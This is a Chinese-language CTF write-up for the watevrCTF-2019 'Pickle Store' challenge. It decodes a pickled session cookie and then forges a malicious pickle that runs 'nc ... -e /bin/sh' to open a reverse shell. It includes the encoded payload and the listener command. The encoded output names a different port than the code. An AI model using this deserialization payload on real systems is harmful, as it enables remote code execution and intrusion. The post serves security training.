---
title: '[watevrCTF-2019]Pickle Store'
date: 2024-09-24 16:16:34
tags: shell反弹
categories: 刷题笔记
---

## [watevrCTF-2019]Pickle Store

我们发现购买第一个和第二个时，cookie会发生变化

![image-20240924163709474](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241637562.png)

所以我们想到，是否能伪造session来购买flag

因为题目提到了pickle，那我们考虑用pickle反序列化来解析这个session

<!--more-->

 https://www.php.cn/python-tutorials-372984.html

![image-20240924164031587](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241640656.png)

我们可以明确，这段session是被反序列化出来的，序列化后的信息被base64加密过后再被放到session里

所以我们反推原始cookie信息

```
import pickle
from base64 import *

enc = "gAN9cQAoWAUAAABtb25leXEBTQQBWAcAAABoaXN0b3J5cQJdcQMoWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBFgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQVYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQZYFQAAAFl1bW15IHN0YW5kYXJkIHBpY2tsZXEHWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxCFgUAAAAWXVtbXkgc23DtnJnw6VzZ3Vya2FxCWVYEAAAAGFudGlfdGFtcGVyX2htYWNxClggAAAANzM2YWZjODk0NmYwZDQyZWMyODViOGU4MGUyNzEyOTBxC3Uu"

print(pickle.loads(b64decode(enc)))
#运行后回显:{'money': 260, 'history': ['Yummy standard pickle', 'Yummy standard pickle', 'Yummy smörgåsgurka', 'Yummy standard pickle', 'Yummy standard pickle', 'Yummy smörgåsgurka'], 'anti_tamper_hmac': '736afc8946f0d42ec285b8e80e271290'}


```

这段json串"anti_tamper_hmac"字段明显的表明了，使用了加密手段。

我们可以进行getshell

先构造nc的序列化

```
import base64
import pickle


class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 174.0.0.223 443  -e/bin/sh')",))
a = A()
print( base64.b64encode( pickle.dumps(a) ) )
#gASVVAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw4X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4wLjAuMjIzIDk5OTkgLWUvYmluL3NoJymUhZRSlC4=

```



我们先监听端口

```
nc -lvp 443
```

然后将session修改，传上去

然后将页面刷新，成功连接

然后ls再cat flag.txt得到flag

![image-20240927195156608](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409271952708.png)
